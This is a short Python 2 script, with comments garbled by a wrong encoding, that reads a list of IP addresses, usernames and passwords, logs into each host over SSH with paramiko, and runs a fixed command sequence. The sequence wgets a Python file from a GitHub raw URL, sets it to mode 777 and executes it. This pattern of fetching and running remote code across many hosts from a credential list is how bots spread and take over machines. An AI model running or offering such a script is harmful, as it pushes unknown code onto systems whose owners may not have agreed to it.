#-*- coding: utf-8 -*-
#!/usr/bin/python 
import paramiko
import sys

'''
ʹ��ǰ���Ȱ�װparamiko����������
pip install paramiko
'''

def ssh(ip, username, passwd, cmd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, 22, username, passwd, timeout=10)
        print "===========================" + ip + "==========================="
        for m in cmd:
            stdin, stdout, stderr = ssh.exec_command(m)
#           stdin.write("Y")   #�򵥽��������� ��Y�� 
            out = stdout.readlines()
            #��Ļ���
            for o in out:
                print o,
        ssh.close()
        print ""
    except Exception, e:
        print e
        #print '%s\tError\n' % (ip)
        pass


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "Usage: ssh_login.py iplist.txt"
        exit(0)

    #Ҫִ�е������
    cmd = ['wget https://raw.githubusercontent.com/onefor1/MyTools/master/test.py', 'chmod 777 test.py', 'python test.py']
    filename = sys.argv[1]
    with open(filename) as file:
        line = file.readline().strip()
        while line:
            ip, username, password = line.split(' ')
            ssh(ip, username, password, cmd)
            line = file.readline().strip()


    
    
    
    
        
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    